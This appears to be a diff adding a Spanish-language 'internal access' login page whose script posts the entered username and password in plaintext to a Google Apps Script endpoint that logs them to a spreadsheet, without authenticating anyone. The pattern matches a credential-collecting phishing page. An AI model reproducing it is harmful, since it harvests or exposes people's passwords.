@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Acceso Interno</title>
+    <style>
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 350px; }
+        h2 { text-align: center; color: #333; }
+        .field { position: relative; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        .toggle-password { position: absolute; right: 10px; top: 35px; cursor: pointer; }
+        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #218838; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Iniciar Sesión</h2>
+    <form id="miFormulario">
+        <div class="field">
+            <label>Usuario</label>
+            <input type="text" name="Usuario" required>
+        </div>
+        <div class="field">
+            <label>Contraseña</label>
+            <input type="password" name="Password" id="pass" required>
+            <span class="toggle-password" id="btnOjo">👁️</span>
+        </div>
+        <button type="submit" id="btnEnviar">Ingresar</button>
+    </form>
+</div>
+
+<script>
+    const form = document.getElementById('miFormulario');
+    const btnOjo = document.getElementById('btnOjo');
+    const passInput = document.getElementById('pass');
+
+    // Lógica del ojito
+    btnOjo.addEventListener('click', () => {
+        const type = passInput.type === 'password' ? 'text' : 'password';
+        passInput.type = type;
+        btnOjo.textContent = type === 'password' ? '👁️' : '🙈';
+    });
+
+    // Enviar a Google Sheets
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        const btn = document.getElementById('btnEnviar');
+        btn.disabled = true;
+        btn.innerText = "Enviando...";
+
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxH87FDVAgPbIQ6uYfIlUd6SRIGiHwtYd7IXgZvWzbmihH1PF-U9HrXKM_zTlNXiU9xYA/exec';
+
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => {
+              alert('Datos registrados correctamente');
+              form.reset();
+              btn.disabled = false;
+              btn.innerText = "Ingresar";
+          })
+          .catch(error => {
+              console.error('Error!', error.message);
+              alert('Hubo un error al guardar.');
+              btn.disabled = false;
+          });
+    });
+</script>
+
+</body>
+</html>
